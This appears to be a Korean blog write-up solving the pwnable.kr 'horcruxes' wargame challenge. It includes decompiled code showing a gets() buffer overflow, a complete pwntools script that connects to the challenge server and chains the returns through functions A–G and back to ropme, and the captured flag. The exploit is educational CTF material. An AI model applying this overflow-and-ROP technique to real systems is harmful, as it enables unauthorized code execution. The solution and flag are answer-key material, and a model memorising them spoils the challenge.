---


---

<h1 id="pwnable.krhorcruxes-문제-풀이"><a href="http://pwnable.kr">pwnable.kr</a>:horcruxes 문제 풀이</h1>
<h2 id="관찰분석">2019-07-17 관찰&amp;분석</h2>
<p><code>file horcruxes</code> 로 알아보았다.</p>
<pre><code>horcruxes: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=bed2c3c01d21a3cbb1109e76a83310dfb8a077be, not strippedenter code here
</code></pre>
<p>32bit의 리눅스 실행파일이다. 실행해보면 7개의 호크룩스를 찾아 달라고 한다.<br>
IDA로 분석해 보았다.</p>
<p>*main()</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ST1C_4

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  alarm(0x3Cu);
  hint();
  init_ABCDEFG();
  v3 = seccomp_init(0);
  seccomp_rule_add(v3, 2147418112, 173, 0);
  seccomp_rule_add(v3, 2147418112, 5, 0);
  seccomp_rule_add(v3, 2147418112, 3, 0);
  seccomp_rule_add(v3, 2147418112, 4, 0);
  seccomp_rule_add(v3, 2147418112, 252, 0);
  seccomp_load(v3);
  return ropme();
}
</code></pre>
<p>각 변수들의 초기화가 이루어지고 ropme를 리턴시키고 있다.<br>
ropme함수가 이번 문제의 핵심이라고 예상 할 수 있다.</p>
<p>*ropme()</p>
<pre><code>int ropme()
{
  char s[100]; // [esp+4h] [ebp-74h]
  int v2; // [esp+68h] [ebp-10h]
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &amp;v2);
  getchar();
  if ( v2 == a )
  {
    A();
  }
  else if ( v2 == b )
  {
    B();
  }
  else if ( v2 == c )
  {
    C();
  }
  else if ( v2 == d )
  {
    D();
  }
  else if ( v2 == e )
  {
    E();
  }
  else if ( v2 == f )
  {
    F();
  }
  else if ( v2 == g )
  {
    G();
  }
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
</code></pre>
<p>scanf로 각 변수 값을 입력하면 내용이 반환된다.<br>
마지막엔 gets로 입력 받은 내용이 a부터 g까지의 합과 같으면 flag를 보여주게 되어있다.</p>
<p>*ABCDEFG()</p>
<pre><code>unsigned int init_ABCDEFG()
{
  int v0; // eax
  unsigned int result; // eax
  unsigned int buf; // [esp+8h] [ebp-10h]
  int fd; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  if ( read(fd, &amp;buf, 4u) != 4 )
  {
    puts("/dev/urandom error");
    exit(0);
  }
  close(fd);
  srand(buf);
  a = -559038737 * rand() % 0xCAFEBABE;
  b = -559038737 * rand() % 0xCAFEBABE;
  c = -559038737 * rand() % 0xCAFEBABE;
  d = -559038737 * rand() % 0xCAFEBABE;
  e = -559038737 * rand() % 0xCAFEBABE;
  f = -559038737 * rand() % 0xCAFEBABE;
  v0 = rand();
  g = -559038737 * v0 % 0xCAFEBABE;
  result = f + e + d + c + b + a + -559038737 * v0 % 0xCAFEBABE;
  sum = result;
  return result;
}
</code></pre>
<p>하지만 a부터 g까지의 변수값은 랜덤으로 정해진다. 그렇기 때문에 정상적인 방법으로는 sum을 구해낼 수 없다.<br>
gets함수가 버퍼의 용량과 상관 없이 데이터를 받는 점을 이용하여 payload를 전송 할 수 있을 것이다.</p>
<p><code>pwndbg ./horcruxes</code> 로 <code>p A</code> 해보았다.</p>
<pre><code>$1 = {&lt;text variable, no debug info&gt;} 0x809fe4b &lt;A&gt;
</code></pre>
<p>함수의 주소가 그대로 노출되었다. 이제 payload과정을 생각해보자<br>
BOF -&gt; A() -&gt; B()… -&gt; G() 까지 한 후 출력된 결과물을 합하고 ropme()를 실행하여 입력해주면 될 것이다.</p>
<h2 id="gets와-함수주소의-오류">2019-07-18 gets와 함수주소의 오류</h2>
<p>수의 주소를 사용할 때 해당 주소에 "\n(0x0a)"이 포함되어있으면 <code>gets</code> 함수에 들어가 줄 내림으로 인식하기 때문에 문제가 생기게 된다.<br>
따라서 <strong>그 함수를 호출하는 부분의</strong> 주소를 이용하는 등 다른 우회방법을 생각해야 한다.</p>
<h2 id="payload1">2019-07-19 Payload1</h2>
<pre><code>from pwn import*
LOCAL = './horcruxes'
s = ssh("horcruxes", "pwnable.kr", port = 2222, password = "guest")
conn = s.remote("localhost", 9032)

p = process(LOCAL)
e = ELF(LOCAL)
l = e.libc
</code></pre>
<p><a href="http://pwnable.kr">pwnable.kr</a> 서버와 통신하게 준비했다. 동시에 주소를 자동으로 구할 수 있도록 <code>scp</code> 명령어로 내려받은 후 elf연결 했다.</p>
<pre><code>A = e.sym.A
B = e.sym.B
C = e.sym.C
D = e.sym.D
E = e.sym.E
F = e.sym.F
G = e.sym.G
ropme = 0x809fffc
</code></pre>
<p>주소를 변수에 넣어준다.</p>
<pre><code>print conn.recvuntil(":")
conn.sendline("1")
print conn.recvuntil(":")

payload = ""
payload += 'A' * 120
payload += p32(A)
payload += p32(B)
payload += p32(C)
payload += p32(D)
payload += p32(E)
payload += p32(F)
payload += p32(G)
payload += p32(ropme)
</code></pre>
<p>~Menu: 부분을 넘어가 주고, 정수 입력을 마친 후, earned? 부분을 넘어가 준다. (가독성을 위해 <code>print</code>로 출력시켰다.)<br>
후에 Payload를 작성해 간다. BOF하고 그 RET에 A()를 그 RET에 B()를… 마지막엔 ropme()를 올려준다.</p>
<pre><code>conn.sendline(payload)

sum = 0
for i in range(0, 7):
        conn.recvuntil("EXP +")
        sum += int(conn.recvuntil(')')[:-1])
</code></pre>
<p>Payload를 보내주고 알파벳 함수가 실행되면 <code>"You found \"******************\" (EXP +%d)\n"</code> 식으로 출력된다.<br>
이 때 EXP +부분 까지 넘겨주고 그 뒤의 정수는 '괄호 닫기’부분 까지 받은 후 '괄호 닫기’를 제한다.<br>
그렇게 얻은 정수를 반복문을 통해 더해간다.</p>
<pre><code>print conn.recvuntil(":")
conn.sendline("1")
print conn.recvuntil(":")
conn.sendline(str(sum))
conn.interactive()
</code></pre>
<p>다시 ropme()가 실행됬을 때 마찬가지로 ~Menu: 와 ~earned : 부분을 넘어간 후 구해준 더한 값을 입력 해 준다.</p>
<pre><code>Magic_spell_1s_4vad4_K3daVr4!
</code></pre>
<p>성공했다.</p>

